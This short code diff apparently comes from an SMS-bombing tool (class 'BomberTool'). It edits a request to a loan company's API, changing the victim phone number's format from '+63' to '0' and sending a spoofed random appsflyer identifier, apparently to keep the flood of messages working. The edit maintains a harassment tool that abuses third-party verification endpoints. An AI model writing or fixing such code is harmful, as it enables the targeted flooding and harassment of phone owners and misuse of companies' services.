@@ -334,7 +334,7 @@ class BomberTool:
             }
             data = {
                 'businessId': 'EZLOAN',
-                'contactNumber': f'+63{fp}',
+                'contactNumber': f'0{fp}',
                 'appsflyerIdentifier': f'{ts}-{random.randint(10**18, 10**19 - 1)}'
             }
             r = requests.post(
